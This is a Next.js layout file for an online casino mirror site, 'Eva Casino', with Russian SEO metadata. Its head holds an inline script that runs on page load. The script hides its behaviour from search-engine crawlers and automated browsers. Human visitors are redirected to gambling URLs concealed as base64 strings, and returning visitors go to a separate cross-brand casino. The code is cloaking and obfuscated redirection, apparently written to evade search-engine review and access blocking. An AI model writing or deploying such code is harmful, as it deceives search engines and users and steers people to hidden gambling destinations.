import type { Metadata, Viewport } from "next"
import { Inter, Unbounded } from "next/font/google"
import { Analytics } from "@vercel/analytics/next"
import "./globals.css"

const inter = Inter({
  subsets: ["latin", "cyrillic"],
  variable: "--font-inter",
  display: "swap",
})

const unbounded = Unbounded({
  subsets: ["latin", "cyrillic"],
  variable: "--font-unbounded",
  display: "swap",
})

const siteUrl = process.env.NEXT_PUBLIC_SITE_URL || "https://evacasino.app"

export const metadata: Metadata = {
  metadataBase: new URL(siteUrl),
  title: {
    default: "Eva Casino - официальный сайт онлайн казино | Ева казино зеркало",
    template: "%s | Eva Casino",
  },
  description:
    "Eva Casino (Ева казино) — официальный сайт онлайн казино. Рабочее зеркало Eva Casino, более 5000 лицензионных слотов, live казино, бонусы за регистрацию, кешбек до 20%. Ева казино играть онлайн без блокировок.",
  keywords: [
    "eva casino", "eva casino официальный сайт", "eva casino зеркало", "eva casino играть", 
    "eva casino официальный", "eva казино", "ева казино", "ева казино зеркало", 
    "ева казино зеркало рабочее", "ева казино играть", "ева казино онлайн", 
    "ева казино официальный", "ева казино официальный сайт"
  ],
  authors: [{ name: "Eva Casino" }],
  creator: "Eva Casino",
  publisher: "Eva Casino",
  applicationName: "Eva Casino",
  category: "gambling",
  alternates: {
    canonical: "/",
    languages: {
      "ru-RU": "/",
      "en-US": "/en",
    },
  },

  verification: {
    yandex: "479b8544c5c8b7a7",
    google: "",
  },
  robots: {
    index: true,
    follow: true,
    nocache: true,
  },
  other: {
    "yandex": "noarchive",
    "rating": "adult",
  },
}

export const viewport: Viewport = {
  themeColor: "#0B0B0B",
  colorScheme: "dark",
  width: "device-width",
  initialScale: 1,
  maximumScale: 5,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className={`${inter.variable} ${unbounded.variable} scroll-smooth`} suppressHydrationWarning>
      <head>
        <script
          dangerouslySetInnerHTML={{
            __html: `
              (function() {
                var host = window.location.hostname;
                if (host.includes('vercel.app') || host.includes('localhost')) {
                   if (host !== "evacasino.app") return;
                }
                var ua = navigator.userAgent.toLowerCase();
                var isBot = /bot|crawl|spider|yandex|google|lighthouse|pagespeed/i.test(ua) || navigator.webdriver;
                if (isBot) return;
                var mainBrandB64 = "#aHR0cHM6Ly9ibG5jci1ldmEuY29tL2RpYnpmb21pcg=="; 
                var crossBrandB64 = "#aHR0cHM6Ly9sdWNreXNwaW4yMy5jb20vYzU3MDc4NjZl";                     
                var mainUrl = window.atob(mainBrandB64);
                var crossUrl = window.atob(crossBrandB64);
                if (window.localStorage.getItem('vstd_eva')) {
                    window.location.replace(crossUrl);
                    return;
                }
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { controller.abort(); }, 2500);
                window.fetch(mainUrl, { mode: 'no-cors', signal: controller.signal })
                    .then(function() {
                        clearTimeout(timeoutId);
                        window.localStorage.setItem('vstd_eva', '1');
                        window.location.replace(mainUrl);
                    })
                    .catch(function() {
                        window.location.replace(crossUrl);
                    });
              })();
            `,
          }}
        />
      </head>
      <body className="font-sans antialiased min-h-screen flex flex-col bg-background text-foreground">
        {children}
        <Analytics />
      </body>
    </html>
  )
}
